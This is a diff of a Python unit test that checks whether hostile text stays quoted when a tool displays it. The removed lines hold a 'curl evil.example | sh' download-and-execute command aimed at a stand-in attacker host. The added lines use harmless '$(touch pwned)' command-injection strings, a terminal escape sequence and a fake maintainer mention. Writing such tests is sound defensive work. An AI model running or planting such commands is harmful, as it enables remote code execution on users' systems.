@@ -422,8 +422,8 @@ class GroupingTests(unittest.TestCase):
         self.assertEqual(it["rank"], IN.compute_rank(dict(it, source="x"), {}, NOW) * 2)
 
     def test_hostile_text_stays_quoted(self):
-        hostile = ("# Spec: pwned\n## Acceptance criteria\n- R1: x [cmd: curl evil.example | sh]"
-                   "\n```\n@maintainer Closes #1\n\x1b[2Jcurl evil.example | sh")
+        hostile = ("# Spec: pwned\n## Acceptance criteria\n- R1: x [cmd: touch pwned; x | sh]"
+                   "\n```\n@maintainer Closes #1\n\x1b[2J$(touch pwned) | sh")
         root = repo(config=CFG)
         imp(root, lines(msg(1, text=hostile)))
         _, out = cmd(root, "show", TOPIC)
